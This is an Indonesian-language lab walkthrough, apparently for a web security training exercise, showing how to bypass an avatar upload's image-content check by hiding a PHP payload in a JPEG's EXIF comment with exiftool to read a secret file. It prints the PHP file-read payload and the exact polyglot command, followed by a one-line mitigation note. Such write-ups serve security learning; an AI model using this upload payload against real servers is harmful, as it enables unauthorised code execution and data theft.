terdapat suatu celah di fungsi upload file meskipun system sudah menerapkan validasi yang cukup canggih dimana server memastikan validasi dalam file yang memastikan adanya awalan dan dimansi ukuran untuk memastikan bahwa file tersebut 
memang gambar isinya. berikut cara menyelesaikan lab kali ini:

1. masuk ke lab dan hubungkan ke burp suite untuuk melakukan reconnaisance
2. login menggunakan user valid dan cari fitur upload file untuk avatar
3. coba upload exploit.php dengan isi file seperti ini:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
   maka anda akan mendapati bahwa file itu diblokir karena tidak sesuai dengan kriteria jpeg ataupun png maka kita haru memasukkkan kode tersebut kedalam gambar asli
4. gunakan tools exiftool dengan command seperti ini
   ```cmd
   exiftool -Comment='<?php echo "---START---" . file_get_contents("/home/carlos/secret") . "---END---"; ?>' exploit.jpeg -o polyglot.php
   ```
5. upload polyglot.php ke fitur upload file dan amati respon http yang seharusnya mengandung gambar dari polyglot.php maka akan memunculkan token

Mitigasi:
Kombokan perbaikan ini dengan jenis jenis defens lainnya seperti pembolikiran ekstensi untuk menjaga celah ini
